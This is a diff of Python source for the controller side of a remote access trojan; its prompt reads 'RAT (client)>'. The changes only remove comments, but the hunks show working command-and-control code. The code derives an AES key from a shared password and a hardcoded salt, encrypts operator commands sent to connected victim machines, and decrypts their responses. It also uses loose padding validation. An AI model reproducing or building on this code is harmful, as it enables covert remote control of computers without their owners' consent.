@@ -23,7 +23,6 @@ SALT = b"ratsalt12345678"
 clients = {}
 clients_lock = threading.Lock()
 
-# --- Simple Encryption Setup ---
 backend = default_backend()
 
 def derive_key(password: bytes, salt: bytes) -> bytes:
@@ -38,7 +37,6 @@ def derive_key(password: bytes, salt: bytes) -> bytes:
     key = kdf.derive(password)
     return key
 
-# Derive the key once at startup
 try:
     AES_KEY = derive_key(SHARED_PASSWORD, SALT)
     print("[+] Encryption key derived from password.")
@@ -52,15 +50,12 @@ def encrypt_data(data: str) -> bytes:
         return data.encode('utf-8')
     
     try:
-        # Ensure data is bytes
         if isinstance(data, str):
             data = data.encode('utf-8')
             
         iv = crypto_os.urandom(16)
         cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=backend)
         encryptor = cipher.encryptor()
-        
-        # PKCS7 padding
         pad_len = 16 - (len(data) % 16)
         padded_data = data + bytes([pad_len] * pad_len)
         
@@ -79,7 +74,6 @@ def decrypt_data(data: bytes) -> str:
             return str(data)
     
     try:
-        # Handle potential string input
         if isinstance(data, str):
             data = data.encode('utf-8')
             
@@ -94,7 +88,6 @@ def decrypt_data(data: bytes) -> str:
         decryptor = cipher.decryptor()
         padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
         
-        # More lenient padding validation
         pad_len = padded_plaintext[-1]
         if pad_len > 16:
             debug_print("Padding warning: invalid pad length, trying to strip last byte")
@@ -122,7 +115,6 @@ def handle_client(client_socket, address):
             data = client_socket.recv(BUFFER_SIZE)
             if not data :
                 break
-            # --- Decrypt received data ---
             decrypted_response = decrypt_data(data)
             print(f"\n[RECV from {client_name} ({address})]:\n{decrypted_response}\n---END OF RESPONSE---")
 
@@ -201,13 +193,12 @@ def interact_with_client(client_socket, client_name, address):
     print(f"[+] Interacting with {client_name} ({address}). Type 'back' to return to main prompt.")
     try:
         while True:
-            cmd = input(f"RAT ({client_name})> ").rstrip('\n') # Strip potential newlines
+            cmd = input(f"RAT ({client_name})> ").rstrip('\n') 
             if not cmd:
                 continue
             if cmd.lower() == 'back':
                 break
-            # --- Encrypt command before sending ---
-            encrypted_cmd = encrypt_data(cmd + "\n") # Add newline back for client parsing
+            encrypted_cmd = encrypt_data(cmd + "\n") 
             if encrypted_cmd:
                 client_socket.sendall(encrypted_cmd)
                 print(f"[+] Encrypted command sent to {client_name}. Awaiting response...")
